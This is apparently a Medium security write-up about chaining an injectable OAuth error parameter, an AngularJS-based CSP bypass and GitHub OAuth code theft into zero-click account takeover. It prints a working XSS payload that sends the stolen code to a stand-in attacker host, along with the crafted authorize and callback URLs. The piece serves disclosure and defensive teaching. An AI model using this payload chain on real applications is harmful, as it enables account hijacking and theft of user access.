# :globe_with_meridians: Medium

---

# XSS on the Oauth callback URL with CSP bypass leading to zero-click account takeover

## Introduction

In one of my recent projects, I came across a series of seemingly non-critical vulnerabilities. Surprisingly, when these issues were combined together, they created a major security risk — a zero-click account takeover vulnerability. The main culprit was the seemingly usual OAuth callback URL, which, upon closer inspection, revealed several problems.

In this article, we’ll take a detailed look at the OAuth callback URL, addressing each problem step by step. We’ll explain the chain of events that allowed us to exploit these issues. Our goal is to provide a real-world example that highlights the potential dangers similar problems can pose to the security of web applications and user data.

## What is OAuth?

OAuth is a widely used protocol that allows applications to facilitate user sign-ins from popular providers such as Google or GitHub through their accounts. The OAuth process comprises several key steps:

- User Requests Access: It all starts when a user, known as the Resource Owner (RO), seeks access to a particular resource.

- App Initiates Redirection: The application, or Client (RP), then initiates redirection by directing the User Agent (UA), typically a web browser, to an Authorization Server (AS), which could be AzureAD, Okta, Cognito, Google, or similar trusted servers that can grant access.

- User Grants Approval: The RO interacts with the Authorization Server and grants approval for the requested access.

- Server Issues a Token: After receiving the RO’s consent, the AS generates and sends an access token back to the Client

- Token Enables Data Access: With the access token in hand, the Client securely accesses the user’s data or protected resources on the Resource Server (RS).

*OAuth schema*

## XSS on the OAuth callback URL

## Discovering the injection

During our routine security assessments, we examine every step of an application’s authentication process, searching for potential misconfigurations or vulnerabilities. In this case, our interest was attracted with the final step: the OAuth callback URL. This URL serves as the endpoint to which the OAuth provider redirects the user after authentication.

Typically, a callback URL looks like this:

```
https://example.com/callback?code=AUTHORIZATION_CODE
```

However, we stumbled upon a crucial detail: **the same callback URL was used for displaying error messages.** For instance, when GitHub couldn’t authorize a user, it redirected them to the callback URL with an error message:

```
https://example.com/github/ofg/callback?error=redirect_uri_mismatch&error_description=Wrong+URI
```

We noticed that any text could be injected into the ***error_description ***parameter, and it would be displayed on the page:

## Bypassing the CSP

Usually, the first thing you do when you have an opportunity to inject any text on the page — you try to perform a Cross-Site Scripting attack. But this time, the application CSP was very restrictive and did not allow us to execute inline scripts:

To circumvent the CSP, we leveraged the fact that the application used AngularJS, with the library loaded from the same domain. This allowed us to load the AngularJS library without violating the CSP. We could then use Angular templating functionality to inject malicious code.

Our payload creation process involved importing the AngularJS library and using Angular directives to initiate the payload, making use of the ***$event.view*** object, which exposed the window object. This approach effectively bypassed the CSP, allowing us to execute our payload.

The final payload looked like this:

Then we just URL-encoded the payload above and injected it to ***error_description*** parameter. When the URL is open, the code is executed, despite the CSP:

## Weaponizing the XSS to steal OAuth codes

GitHub OAuth employs a specific authorization URL to furnish a response code and effectuate redirection to a callback URL.

This callback URL is subject to verification, so it is impossible to redirect users to malicious domains to steal the response code, which is returned as a parameter.

## Get Serj Novoselov’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Nonetheless, as discovered previously the application utilizes a single URL for both OAuth callbacks and displaying OAuth errors. Given that the error page is susceptible to cross-site scripting (XSS), it becomes feasible to steal an OAuth response code through malicious code injection.

An OAuth authorization flow follows this pattern:

**1.** User visits the GitHub authorize URL.

**2.** If previously authorized, the user is redirected to the callback URL with a code.

**3.** The callback validates the code and issues session cookies.

GitHub authorize and redirect request looks like this:

Code from the response above is used to issue the application cookies:

While the ***redirect_uri*** parameter undergoes verification, allowing only whitelisted callback URLs, **the parameters** inside the callback URL **remain unchecked.**

So, this vulnerability is exploited by appending additional parameters to the whitelisted callback URL, such as ***?error=q%26error_description=blahblah***. This manipulation prompts the application to display the error page, **while retaining a valid OAuth response code**.

As identified previously the error page has an XSS vulnerability that can be used to seize an OAuth code. The XSS payload is structured as follows, aiming to redirect the user to an attacker-controlled domain and utilize the OAuth response code as a path:

```
<!DOCTYPE html>
<html>
<head>
<meta charset=”utf-8" />
<title>Zero Click Account takeover</title>
<meta name=”description” content=”” />
<meta name=”viewport” content=”width=device-width” />
<base href=”/” />
<script src=”lib/socket.io.min.js”></script>
</head>
<body>
<script src=”scripts/vendor-31a1.js”></script>
<div ng-app=”” ng-init=””>
<input ng-on-focus=”$event.view.location = ‘https://ATTACKER-URL.COM/' %2b $event.view.location.search.slice(1).split(‘%26’)[2].split(‘=’)[1]” autofocus />
</div>
</body>
</html>
```

The payload must be URL encoded, **with “+” and “&” characters encoded twice** due to multiple redirections.

Then we insert this encoded payload into the ***error_description*** parameter of the redirect URL (callback URL):

```
https://github.com/login/oauth/authorize?response_type=code&redirect_uri=https://example.com/auth/github/ofg/callback?error=q%26error_description=XSS_PAYLOAD_HERE&scope=repo%2Cread%3Aorg%2Cdelete_repo%2Cworkflow%2Cuser%3Aemail&client_id=*
```

When a previously authorized user accessed this malicious URL, the following sequence occurred:

**1.** GitHub receives an authorization request.

**2.** GitHub verifies the validity of the callback URL.

**3.** As the user was previously authorized, GitHub issues the response code, attaches it to the callback URL, and redirects the user.

**4.** Upon reaching the callback page, XSS is executed, extracting the OAuth code from the parameter and transmitting it to the attacker’s server.

GitHub authorize request. Redirecting to the error page, yet retaining a valid code in the URL.

*GitHub authorize request*

The user’s browser executes the XSS and sends the code from the parameter to the remote server:

*XSS execution*

The attacker obtains the OAuth code:

*OAuth code is stolen*

This OAuth code could then be used to gain unauthorized access to the application:

```
https://example.com/auth/github/ofg/callback?code=CODE_HERE
```

## Conclusion

In this exploration of a real-world security vulnerability, we’ve uncovered how a series of seemingly inconsequential issues, when chained together, can result in a critical account takeover scenario. By delving into the intricacies of OAuth, devising a strategy to bypass Content Security Policy (CSP) restrictions, and exploiting Cross-Site Scripting (XSS), we’ve demonstrated the domino effect that can lead to a full-blown security breach.

---
